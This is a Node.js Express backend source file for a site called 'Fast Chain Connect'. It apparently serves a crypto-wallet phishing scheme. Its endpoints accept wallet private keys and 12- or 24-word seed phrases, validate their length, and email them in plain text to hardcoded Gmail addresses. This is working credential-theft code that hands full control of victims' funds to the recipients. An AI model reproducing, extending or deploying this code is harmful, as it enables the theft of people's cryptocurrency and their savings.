const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
const dotenv = require("dotenv");

dotenv.config();

const app = express();

// ✅ Fix CORS origin 
const allowedOrigins = [
  "https://fastchainconnect.com/",
  "https://back.fastchainconnect.com/",
  "https://fastchainconect-back.vercel.app/",
  "http://localhost:5173",
];

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  })
);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ Nodemailer setup
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.ADMIN_EMAIL,
    pass: process.env.ADMIN_PASSWORD,
  },
});

// ✅ Home route
app.get("/", (req, res) => {
  res.send("✅ Fast Chain Connect Server Running");
});

// 🔐 Private Key
app.post("/api/submit/private-key", async (req, res) => {
  const { privateKey } = req.body;

  if (!privateKey) {
    return res
      .status(400)
      .json({ success: false, message: "Private key is required" });
  }

  try {
    await transporter.sendMail({
      from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
      to: [process.env.ADMIN_EMAIL, "akannioladimeji135@gmail.com"],
      //to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
      subject: "New Private Key Submitted",
      text: `Private Key: ${privateKey}`,
    });

    res.json({ success: true, message: "Private key submitted" });
  } catch (error) {
    console.error("Error sending private key email:", error);
    res.status(500).json({ success: false, message: "Failed to send email" });
  }
});

// 🧠 12-word Seed Phrase Submissions
app.post("/api/submit/seed-phrase", async (req, res) => {
  const { seedPhrase } = req.body;

  if (!seedPhrase) {
    return res
      .status(400)
      .json({ success: false, message: "Seed phrase is required" });
  }

  const words = seedPhrase.trim().split(/\s+/);
  if (words.length !== 12) {
    return res.status(400).json({
      success: false,
      message: "Seed phrase must be exactly 12 words",
    });
  }

  const formatted = words.join(" ");

  try {
    await transporter.sendMail({
      from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
      to: [process.env.ADMIN_EMAIL, "akannioladimeji135@gmail.com"],
      // to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
      subject: "New 12-Word Seed Phrase Submitted",
      text: `Seed Phrase:\n\n${formatted}`,
    });

    res.json({ success: true, message: "12-word seed phrase submitted" });
  } catch (error) {
    console.error("Error sending seed phrase email:", error);
    res.status(500).json({ success: false, message: "Failed to send email" });
  }
});

// 🧠 24-word Seed Phrase Submission
app.post("/api/submit/seed-phrase-24", async (req, res) => {
  const { seedPhrase } = req.body;

  if (!seedPhrase) {
    return res
      .status(400)
      .json({ success: false, message: "Seed phrase is required" });
  }

  const words = seedPhrase.trim().split(/\s+/);
  if (words.length !== 24) {
    return res.status(400).json({
      success: false,
      message: "Seed phrase must be exactly 24 words",
    });
  }

  const formatted = words.join(" ");

  try {
    await transporter.sendMail({
      from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
      to: [process.env.ADMIN_EMAIL, "akannioladimeji135@gmail.com"],
      // to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
      subject: "New 24-Word Seed Phrase Submitted",
      text: `24-Word Seed Phrase:\n\n${formatted}`,
    });

    res.json({ success: true, message: "24-word seed phrase submitted" });
  } catch (error) {
    console.error("Error sending 24-word seed phrase email:", error);
    res.status(500).json({ success: false, message: "Failed to send email" });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
